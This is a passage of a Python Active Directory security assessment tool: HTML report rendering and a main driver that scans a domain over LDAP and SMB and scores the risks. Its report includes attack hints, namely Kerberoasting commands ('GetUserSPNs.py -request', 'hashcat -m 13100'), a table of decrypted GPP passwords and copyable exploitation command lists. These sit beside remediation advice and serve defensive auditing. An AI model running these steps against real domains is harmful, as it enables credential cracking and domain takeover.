                f'<th>Username</th><th>Decrypted password</th></tr></thead><tbody>{rows}</tbody></table></section>')

    def _adcs_section(self):
        fs = [f for f in self.findings if f.rule_id in (
            "A-CertTempCustomSubject","A-CertTempAnyPurpose","A-CertTempAgent","A-CertEnrollHttp","A-CertTemplateESC4")]
        if not fs:
            return ""
        rows = ""
        for f in fs:
            esc = next((m for m in ("ESC1","ESC2","ESC3","ESC4","ESC8") if m in (f.details or "")), "")
            rows += (f'<tr><td><code>{self._e(f.rule_id)}</code></td><td><span class="kc-badge kc-badge-crit">{esc}</span></td>'
                     f'<td>{self._e(f.title)}</td><td class="kc-detail">{self._e(", ".join(f.affected[:5]))}</td>'
                     f'<td><span class="kc-sev-pill" style="background:{f.sev_colour}">{self._e(f.severity)}</span></td></tr>')
        return ('<section class="kc-section"><h2 class="kc-h2">📜 ADCS certificate issues</h2>'
                '<p class="kc-sub">Only templates published to a CA are listed. Validate enrollment ACLs before exploitation.</p>'
                '<table class="kc-table"><thead><tr><th>Rule</th><th>ESC</th><th>Issue</th><th>Template / CA</th>'
                f'<th>Severity</th></tr></thead><tbody>{rows}</tbody></table></section>')

    def _kerberoast_section(self):
        kf = [f for f in self.findings if f.rule_id in ("S-Kerberoastable","S-KerberoastableAdmin","P-Kerberoasting")]
        accts = _dedup_keep_order([a for f in kf for a in f.affected])[:40]
        if not accts:
            return ""
        rows = "".join(f'<tr><td><strong>{self._e(a)}</strong></td></tr>' for a in accts)
        return ('<section class="kc-section"><h2 class="kc-h2">🎟 Kerberoastable accounts</h2>'
                '<p class="kc-sub">Request a TGS and crack offline: <code>GetUserSPNs.py -request</code> → '
                '<code>hashcat -m 13100</code>.</p>'
                f'<table class="kc-table"><thead><tr><th>Account / SPN</th></tr></thead><tbody>{rows}</tbody></table></section>')

    def _acl_section(self):
        acl = self.data.acl_findings
        if not acl:
            return ""
        labels = {"dcsync":"DCSync","dangerous_acl":"Dangerous ACL","owner":"Owner","write_property":"WriteProperty","gpo_write":"GPO Write"}
        cols = {"dcsync":"#b23a2e","dangerous_acl":"#c2702a","owner":"#c2702a","write_property":"#c9a227","gpo_write":"#c2702a"}
        rows = ""
        for f in acl:
            t = f.get("type","")
            rows += (f'<tr><td><strong>{self._e(f.get("sid_name",""))}</strong><div class="kc-sid"><code>{self._e(f.get("sid",""))}</code></div></td>'
                     f'<td><span class="kc-badge" style="background:{cols.get(t,"#888")}">{labels.get(t,t)}</span></td>'
                     f'<td><strong>{self._e(f.get("right",""))}</strong></td><td>{self._e(f.get("object",""))}</td>'
                     f'<td class="kc-detail">{self._e(f.get("detail",""))}</td></tr>')
        return ('<section class="kc-section"><h2 class="kc-h2">🔗 Control paths to Tier 0</h2>'
                '<p class="kc-sub">Principals with these rights can reach Domain Admin via documented chains.</p>'
                '<table class="kc-table"><thead><tr><th>Principal</th><th>Type</th><th>Right</th><th>Target</th>'
                f'<th>Detail</th></tr></thead><tbody>{rows}</tbody></table></section>')

    def _trusts_section(self):
        if not self.data.trusts:
            return ""
        tt = {1:"Downlevel",2:"Uplevel",3:"MIT",4:"DCE"}; td = {0:"Disabled",1:"Inbound",2:"Outbound",3:"Bidirectional"}
        rows = ""
        for t in self.data.trusts:
            name = get_str(t["attrs"],"name") or get_str(t["attrs"],"trustPartner")
            ta = get_int(t["attrs"],"trustAttributes")
            sidf = "<span class='kc-ok'>Yes</span>" if ta & TRUST_ATTR_QUARANTINED else "<span class='kc-bad'>No</span>"
            tgt = "<span class='kc-bad'>Enabled</span>" if ta & TRUST_ATTR_TGT_DELEGATION else "<span class='kc-ok'>Disabled</span>"
            rows += (f'<tr><td><strong>{self._e(name)}</strong></td><td>{tt.get(get_int(t["attrs"],"trustType"),"?")}</td>'
                     f'<td>{td.get(get_int(t["attrs"],"trustDirection"),"?")}</td><td>{sidf}</td><td>{tgt}</td></tr>')
        return ('<section class="kc-section"><h2 class="kc-h2">🤝 Trust relationships</h2>'
                '<table class="kc-table"><thead><tr><th>Partner</th><th>Type</th><th>Direction</th><th>SID filtering</th>'
                f'<th>TGT delegation</th></tr></thead><tbody>{rows}</tbody></table></section>')

    # ── findings table ────────────────────────────────────────────────────────
    def _finding_panel(self, f):
        doc = self._doc(f.rule_id); desc = doc.get("description") or f.details or ""
        parts = []
        if f.mitre:
            parts.append('<div class="kc-attck-row">' + "".join(f'<span class="kc-mini">{self._e(m)}</span>' for m in f.mitre) + '</div>')
        if f.details and f.details != desc:
            parts.append(f'<div class="kc-evidence"><div class="kc-bh">Evidence</div><div class="kc-bb">{self._e(f.details)}</div></div>')
        if desc:
            parts.append(f'<div class="kc-block"><div class="kc-bh">Description</div><div class="kc-bb">{self._e(desc)}</div></div>')
        if doc.get("why"):
            parts.append(f'<div class="kc-block"><div class="kc-bh">Why it matters</div><div class="kc-bb">{self._e(doc["why"])}</div></div>')
        if doc.get("technical"):
            parts.append(f'<div class="kc-block"><div class="kc-bh">Technical detail</div><div class="kc-bb kc-mono">{self._e(doc["technical"])}</div></div>')
        if doc.get("exploit"):
            items = "".join(f'<li><code>{self._e(x)}</code><button class="kc-copy" onclick="kcCopy(this)">copy</button></li>' for x in doc["exploit"])
            parts.append(f'<div class="kc-block kc-attack"><div class="kc-bh">Exploitation</div><ul class="kc-cmd">{items}</ul></div>')
        if doc.get("remediation"):
            items = "".join(f'<li>{self._e(x)}</li>' for x in doc["remediation"])
            parts.append(f'<div class="kc-block kc-fix"><div class="kc-bh">Remediation</div><ul class="kc-fixlist">{items}</ul></div>')
        if doc.get("refs"):
            items = "".join(f'<li><a href="{self._e(u)}" target="_blank" rel="noopener">{self._e(u)}</a></li>' for u in doc["refs"])
            parts.append(f'<div class="kc-block"><div class="kc-bh">References</div><ul class="kc-reflist">{items}</ul></div>')
        if f.affected:
            n = len(f.affected); shown = f.affected[:80]; extra = n - len(shown)
            items = "".join(f'<li>{self._e(a)}</li>' for a in shown)
            tail = f'<li class="kc-more">… and {extra} more</li>' if extra > 0 else ""
            parts.append(f'<div class="kc-block"><div class="kc-bh">Affected ({n})</div><ul class="kc-affected">{items}{tail}</ul></div>')
        if not parts:
            parts.append('<div class="kc-bb">No additional detail.</div>')
        return "".join(parts)

    def _findings_section(self):
        sf = sorted(self.findings, key=lambda f:(self._SEV_ORDER.get(f.severity,9), f.category, f.rule_id))
        rows = []
        seen_rid = set()
        for i, f in enumerate(sf):
            cat_col = CAT_COLOUR.get(f.category,"#888")
            # First finding of a rule keeps the canonical anchor f-<rule_id> so
            # cross-links resolve; duplicates get a unique id (valid HTML).
            anchor = f"f-{f.rule_id}" if f.rule_id not in seen_rid else f"f-{f.rule_id}-{i}"
            seen_rid.add(f.rule_id)
            rows.append(
                f'<tr class="kc-frow" id="{self._e(anchor)}" data-i="{i}" data-sev="{f.severity}" '
                f'data-cat="{f.category}" onclick="kcTog({i})" tabindex="0" role="button" '
                f'onkeydown="if(event.key===\'Enter\'||event.key===\' \'){{event.preventDefault();kcTog({i})}}">'
                f'<td><span id="ic-{i}" class="kc-toggle">+</span></td>'
                f'<td><span class="kc-sev-pill" style="background:{f.sev_colour}">{self._e(f.severity)}</span></td>'
                f'<td><span class="kc-cat-pill" style="background:{cat_col}">{self._e(f.category)}</span></td>'
                f'<td><span class="kc-mtag">L{f.maturity}</span></td>'
                f'<td><code>{self._e(f.rule_id)}</code></td><td><strong>{self._e(f.title)}</strong></td>'
                f'<td class="kc-num">{f.points}</td></tr>'
                f'<tr class="kc-drow" id="dr-{i}" style="display:none"><td></td>'
                f'<td colspan="6"><div class="kc-panel">{self._finding_panel(f)}</div></td></tr>')
        pills = ('<button class="kc-fp kc-fp-on" data-f="sev:" onclick="kcFil(this)">All</button>'
                 '<button class="kc-fp" data-f="sev:CRITICAL" onclick="kcFil(this)" style="--c:#b23a2e">Critical</button>'
                 '<button class="kc-fp" data-f="sev:HIGH" onclick="kcFil(this)" style="--c:#c2702a">High</button>'
                 '<button class="kc-fp" data-f="sev:MEDIUM" onclick="kcFil(this)" style="--c:#c9a227">Medium</button>'
                 '<button class="kc-fp" data-f="sev:LOW" onclick="kcFil(this)" style="--c:#6f8f3f">Low</button>'
                 '<span class="kc-fsep"></span>'
                 '<button class="kc-fp kc-fp-cat" data-f="cat:Anomaly" onclick="kcFil(this)" style="--c:#c2702a">Anomaly</button>'
                 '<button class="kc-fp kc-fp-cat" data-f="cat:Privileged" onclick="kcFil(this)" style="--c:#a8843c">Privileged</button>'
                 '<button class="kc-fp kc-fp-cat" data-f="cat:Stale" onclick="kcFil(this)" style="--c:#5d7a86">Stale</button>'
                 '<button class="kc-fp kc-fp-cat" data-f="cat:Trust" onclick="kcFil(this)" style="--c:#6f8f3f">Trust</button>')
        return ('<section class="kc-section" id="sec-findings">'
                f'<h2 class="kc-h2">All findings <span class="kc-count">({len(self.findings)})</span></h2>'
                f'<div class="kc-toolbar"><div class="kc-pills">{pills}</div><div class="kc-toolbar-r">'
                '<input id="kc-q" type="search" placeholder="Search findings…" oninput="kcApply()">'
                '<button class="kc-fp" onclick="kcAll(1)">Expand</button>'
                '<button class="kc-fp" onclick="kcAll(0)">Collapse</button></div></div>'
                '<div class="kc-showing" id="kc-showing"></div>'
                '<table class="kc-table kc-ftable"><thead><tr><th style="width:28px"></th><th style="width:84px">Severity</th>'
                '<th style="width:96px">Category</th><th style="width:44px">Mat</th><th style="width:190px">Rule</th>'
                '<th>Title</th><th style="width:48px" class="kc-num">Pts</th></tr></thead>'
                f'<tbody>{"".join(rows)}</tbody></table></section>')

    # ── inventory ─────────────────────────────────────────────────────────────
    def _roster(self, gname):
        members = self.data.priv_group_members.get(gname, [])
        return _dedup_keep_order([get_str(m["attrs"],"sAMAccountName") or dn_base(m["dn"]) for m in members])

    def _inventory_section(self):
        d = self.data
        en_u = sum(1 for u in d.users if not uac_has(get_int(u["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE))
        dis_u = len(d.users) - en_u
        en_c = sum(1 for c in d.computers if not uac_has(get_int(c["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE))
        da, ea, sa = self._roster("Domain Admins"), self._roster("Enterprise Admins"), self._roster("Schema Admins")
        sch = SCHEMA_VERSIONS.get(d.schema_version,str(d.schema_version)); maq = d.machine_account_quota
        def chip(ok, label):
            return f'<span class="{"kc-ok" if ok else "kc-bad"}">{label}</span>'
        maq_h = (f"<span class='kc-bad'>{maq}</span>" if maq>0 else (f"<span class='kc-ok'>0</span>" if maq==0 else "<span class='kc-warn'>?</span>"))
        stats = [("Domain", self._e(self.domain)),
                 ("Domain functional level", self._e(FUNCTIONAL_LEVELS.get(d.domain_level,str(d.domain_level)))),
                 ("Forest functional level", self._e(FUNCTIONAL_LEVELS.get(d.forest_level,str(d.forest_level)))),
                 ("Schema version", f"{self._e(sch)} ({d.schema_version})"),
                 ("Users (enabled/disabled)", f"{en_u} / {dis_u}"), ("Computers (enabled)", str(en_c)),
                 ("Domain controllers", str(len(d.dcs))), ("GPOs", str(len(d.gpos))),
                 ("Trusts", str(len(d.trusts))), ("Sites / subnets", f"{len(d.sites)} / {len(d.subnets)}"),
                 ("Domain Admins", str(len(da))), ("Enterprise Admins", str(len(ea))),
                 ("Schema Admins", str(len(sa))), ("Fine-grained PSOs", str(len(d.psoes))),
                 ("Cert templates", str(len(d.cert_templates))),
                 ("LAPS", chip(d.laps_installed, "Installed" if d.laps_installed else "NOT installed")),
                 ("MachineAccountQuota", maq_h),
                 ("ADWS (9389)", chip(not d.adws_available, "open" if d.adws_available else "closed"))]
        cells = "".join(f'<div class="kc-stat"><div class="kc-stat-l">{l}</div><div class="kc-stat-v">{v}</div></div>' for l,v in stats)
        os_dist = defaultdict(int)
        for c in d.computers:
            if uac_has(get_int(c["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE):
                continue
            os_dist[get_str(c["attrs"],"operatingSystem") or "Unknown"] += 1
        top = sorted(os_dist.items(), key=lambda kv:-kv[1])[:10]; omax = max((n for _,n in top), default=1)
        bars = ""
        for os, n in top:
            eol = any(x in os for x in ("XP","2003","2008","Vista","2000","Windows 7"))
            col = "#b23a2e" if eol else "#5d7a86"
            bars += (f'<div class="kc-bar-row"><div class="kc-bar-l">{self._e(os)}</div>'
                     f'<div class="kc-bar-t"><div class="kc-bar-f" style="width:{n/omax*100:.0f}%;background:{col}"></div></div>'
                     f'<div class="kc-bar-n">{n}</div></div>')
        def roster(title, names):
            if not names:
                return ""
            shown = names[:30]; extra = len(names)-len(shown)
            chips = "".join(f'<span class="kc-rchip">{self._e(x)}</span>' for x in shown)
            tail = f'<span class="kc-rchip kc-more">+{extra}</span>' if extra>0 else ""
            return f'<div class="kc-roster"><h4>{title} ({len(names)})</h4><div>{chips}{tail}</div></div>'
        rosters = roster("Domain Admins", da) + roster("Enterprise Admins", ea) + roster("Schema Admins", sa)
        return ('<section class="kc-section" id="sec-inventory"><h2 class="kc-h2">🏰 Domain inventory</h2>'
                f'<div class="kc-stat-grid">{cells}</div>'
                + (f'<h3 class="kc-sub-h">Tier-0 privileged accounts</h3>{rosters}' if rosters else "")
                + (f'<h3 class="kc-sub-h">Operating systems</h3><div class="kc-barchart">{bars}</div>' if bars else "")
                + '</section>')

    def _appendix(self):
        return ('<section class="kc-section" id="sec-appendix"><h2 class="kc-h2">Methodology &amp; scope</h2>'
                '<div class="kc-bb">'
                f'<p><strong>Tool.</strong> {TOOL_NAME} v{VERSION} — an offline, Linux-based Active Directory '
                'security assessment over LDAP/LDAPS/SMB covering four risk categories (Anomaly, Privileged, '
                'Stale, Trust) with classic and modern-escalation coverage (RBCD, constrained delegation, ADCS ESC, privileged '
                'SID-history, computer accounts in privileged groups).</p>'
                '<p><strong>Scoring.</strong> Each finding carries danger points within one of four categories '
                '(Anomaly, Privileged, Stale, Trust). Category scores cap at 100; the global score is the worst '
                'category. A separate CMMI maturity level (1–5) reflects programme maturity — the domain’s level '
                'is the lowest still gated by a failing rule.</p>'
                '<p><strong>Limitations.</strong> Results reflect what the assessing account could read at scan '
                'time. Some controls (host-local registry, CA web-enrollment) are inferred from GPO/LDAP state and '
                'should be confirmed on the host. Point-in-time, authorised-testing use only.</p>'
                f'<p class="kc-muted">Generated {self._e(self.ts)} against {self._e(self.dc_ip)} '
                f'using {self._e(self.auth_mode or "n/a")} authentication.</p></div></section>')

    # ── assemble ──────────────────────────────────────────────────────────────
    def render(self):
        body = (self._cover() + self._nav() + '<main class="kc-container">' +
                self._exec_section() + self._maturity_section() + self._roadmap_section() +
                self._paths_section() + self._attack_section() + self._gpp_section() +
                self._adcs_section() + self._kerberoast_section() + self._acl_section() +
                self._trusts_section() + self._findings_section() + self._inventory_section() +
                self._appendix() + '</main>'
                f'<footer class="kc-footer">{TOOL_NAME} v{VERSION} — authorised security assessment use only · '
                f'generated {self._e(self.ts)}</footer>'
                '<button class="kc-top" onclick="kcJump(\'top\')" title="Back to top">↑</button>')
        return ('<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,initial-scale=1">'
                f'<title>{TOOL_NAME} — {self._e(self.domain)}</title><style>' + _KC_CSS +
                '</style></head><body>' + body + '<script>' + _KC_JS + '</script></body></html>')

    def _remediation(self, rule_id):
        r = (RULE_DOCS.get(rule_id, {}) or {}).get("remediation")
        return r[0] if r else ""


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = build_parser()
    args   = parser.parse_args()

    # Flags that only make sense with Kerberos imply -k.
    if args.ccache or args.aes_key or args.save_ccache:
        args.kerberos = True

    # Prompt for a password when we have a user but no secret of any kind —
    # this covers both the NTLM path and "get me a TGT from a password".
    if (not args.null_session and not args.no_pass
            and args.username and args.password is None
            and not args.hashes and not args.aes_key and not args.ccache
            and not os.environ.get("KRB5CCNAME")):
        import getpass
        args.password = getpass.getpass(f"Password for {args.username}@{args.domain}: ")

    if (args.password is None and not (args.null_session or args.hashes
            or args.aes_key or args.ccache or os.environ.get("KRB5CCNAME"))):
        args.null_session = True
        print("[*] No credentials provided — attempting null session")

    auth_mode = ("Kerberos" if args.kerberos else
                 "NTLM (pass-the-hash)" if args.hashes else
                 "null session" if args.null_session else "NTLM")
    print(f"\n{'='*60}")
    print(f"  {TOOL_NAME} v{VERSION} — AD Security Assessment")
    print(f"  Domain : {args.domain}")
    print(f"  Target : {args.dc_ip}")
    print(f"  Proto  : {'LDAPS' if args.ldaps else 'LDAP'}  |  Auth: {auth_mode}")
    print(f"{'='*60}\n")

    # ── connect ──────────────────────────────────────────────────────────────
    ad_conn = ADConnection(args)
    print("[*] Connecting to LDAP...")
    try:
        if not ad_conn.connect():
            print("[-] Failed to connect. Check credentials and DC IP.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Connection error: {e}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)

    print(f"[+] Connected. Base DN: {ad_conn.base_dn}")

    # ── collect data ─────────────────────────────────────────────────────────
    data = ADData(ad_conn, args)
    try:
        data.collect()
    except Exception as e:
        print(f"[-] Data collection error: {e}")
        if args.verbose:
            traceback.print_exc()

    # ── SYSVOL / GPO checks ──────────────────────────────────────────────────
    if not args.no_smb:
        sysvol = SYSVOLChecker(args, data)
        try:
            sysvol.run()
        except Exception as e:
            if args.verbose:
                print(f"[!] SYSVOL error: {e}")
                traceback.print_exc()

    # ── ACL analysis ─────────────────────────────────────────────────────────
    acl_analyzer = ACLAnalyzer(ad_conn, data, args)
    try:
        acl_analyzer.run()
    except Exception as e:
        if args.verbose:
            print(f"[!] ACL analysis error: {e}")
            traceback.print_exc()

    # ── run checks ───────────────────────────────────────────────────────────
    print("[*] Running security checks...")
    engine = CheckEngine(data, args)
    try:
        engine.run_all()
    except Exception as e:
        print(f"[-] Check engine error: {e}")
        if args.verbose:
            traceback.print_exc()

    findings = engine.findings

    # ── SMB checks ────────────────────────────────────────────────────────────
    if not args.no_smb:
        smb = SMBChecker(args.dc_ip, args, findings)
        try:
            smb.run()
        except Exception as e:
            if args.verbose:
                print(f"[!] SMB check error: {e}")

    # ── score ─────────────────────────────────────────────────────────────────
    scorer = RiskScorer(findings)
    scores = scorer.score()

    # ── print summary ─────────────────────────────────────────────────────────
    total = scores.get("Total", 0)
    label, _ = RiskScorer.risk_label(total)
    print(f"\n{'='*60}")
    print(f"  RESULTS: {label}  (Score: {total}/100)")
    print(f"{'='*60}")
    print(f"  Anomaly   : {scores.get('Anomaly',0):3d}/100")
    print(f"  Privileged: {scores.get('Privileged',0):3d}/100")
    print(f"  Stale     : {scores.get('Stale',0):3d}/100")
    print(f"  Trust     : {scores.get('Trust',0):3d}/100")
    print(f"  Findings  : {len(findings)}")
    print(f"{'='*60}")

    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    sorted_findings = sorted(findings,
        key=lambda f:(sev_order.get(f.severity,5),f.category))
    for f in sorted_findings:
        colour_map = {"CRITICAL":"\033[91m","HIGH":"\033[93m",
                      "MEDIUM":"\033[33m","LOW":"\033[32m","INFO":"\033[36m"}
        reset = "\033[0m"
        if args.no_color:
            colour_map = defaultdict(str)
            reset = ""
        c = colour_map.get(f.severity,"")
        print(f"  {c}[{f.severity:8s}]{reset} [{f.rule_id}] {f.title}")
        if f.details and args.verbose:
            print(f"           {f.details[:120]}")

    # ── HTML report ───────────────────────────────────────────────────────────
    if not args.output:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        args.output = f"scout_{args.domain}_{ts}.html"

    reporter = HTMLReporter(args.domain, args.dc_ip, findings, scores, data,
                            auth_mode=auth_mode, prepared_by=args.operator,
                            scope=args.scope)
    html_out = reporter.render()
    with open(args.output, "w", encoding="utf-8") as fh:
        fh.write(html_out)
    print(f"\n[+] HTML report saved: {args.output}")

    # ── JSON output ───────────────────────────────────────────────────────────
    if args.json:
        jpath = args.json if args.json != "__AUTO__" else f"scout_{args.domain}.json"
        jdata = {
            "tool": TOOL_NAME, "version": VERSION,
            "domain": args.domain, "dc_ip": args.dc_ip, "auth_mode": auth_mode,
            "timestamp": datetime.datetime.now().isoformat(),
            "scores": scores,
            "maturity": {"level": scores.get("Maturity"),
                         "label": MATURITY_LABEL.get(scores.get("Maturity"), "")},
            "findings": [
                {"rule_id": f.rule_id, "title": f.title,
                 "category": f.category, "severity": f.severity,
                 "points": f.points, "maturity": f.maturity, "mitre": f.mitre,
                 "details": f.details, "affected": f.affected}
                for f in sorted_findings
            ]
        }
        with open(jpath, "w", encoding="utf-8") as jf:
            json.dump(jdata, jf, indent=2)
        print(f"[+] JSON findings saved: {jpath}")

    # ── CSV output ────────────────────────────────────────────────────────────
    if args.csv:
        import csv as _csv
        cpath = args.csv if args.csv != "__AUTO__" else f"scout_{args.domain}.csv"
        with open(cpath, "w", encoding="utf-8", newline="") as cf:
            w = _csv.writer(cf)
            w.writerow(["rule_id", "title", "category", "severity", "maturity",
                        "points", "mitre", "affected_count", "details", "affected"])
            for f in sorted_findings:
                w.writerow([f.rule_id, f.title, f.category, f.severity, f.maturity,
                            f.points, "; ".join(f.mitre), len(f.affected),
                            f.details, " | ".join(map(str, f.affected))])
        print(f"[+] CSV findings saved: {cpath}")

    print()
    return 0 if total < 30 else 1


if __name__ == "__main__":
    sys.exit(main())
